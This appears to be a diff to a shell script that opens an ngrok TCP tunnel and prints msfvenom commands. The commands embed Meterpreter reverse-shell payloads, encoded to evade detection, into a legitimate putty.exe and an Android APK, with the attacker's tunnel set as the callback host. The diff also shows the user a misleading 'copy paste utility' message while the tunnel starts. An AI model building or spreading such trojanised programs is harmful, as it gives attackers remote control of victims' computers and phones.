@@ -15,6 +15,7 @@ checko()
 if [[ -e $HOME/ngrok ]]
 then
   echo ""
+  pkill ngrok
 else
 echo -e "[${Green}✔${clear}] ${Red} Ngrok error \$HOME/ngrok. Try again${clear}"
 echo -en "[${Green}✔${clear}] ${IYellow} Link may not be generated press [ctrl + c]: ${clear}"
@@ -28,6 +29,10 @@ checko
 # 1 ngrok vpn connect
 # 1 internet connection check
 # setup to github
+echo -e "[${Green}✔${clear}] ${IYellow} Please wait... ${clear}"
+echo -e "[${Green}✔${clear}] ${IYellow} Copy paste utility loading... ${clear}"
+$HOME/ngrok tcp 5576 > /dev/null &
+sleep 4
 ip=$(curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url|sed 's#tcp://##g'|sed 's#:# #g'|awk '{print $1}')
 vport=$(curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url|sed 's#tcp://##g'|sed 's#:# #g'|awk '{print $2}')
 
@@ -82,3 +87,5 @@ echo -e "
 \t${IGreen}├──${clear} ${Green}msfvenom -a x86 --platform windows -x putty.exe -k -p${IGreen} windows/meterpreter/reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -e x86/shikata_ga_nai -i 3 -b \"\\\x00\" -f exe -o bind.exe
 \t${IGreen}└──${clear} ${Green}msfvenom --platform android --arch dalvik -x myApp.apk -p${IGreen} android/meterpreter/reverse_tcp${clear} ${Green}LHOST=$ip LPORT=$vport -o build.apk${clear}
 "
+
+$HOME/ngrok tcp 5576 > /dev/null 2>&1 &
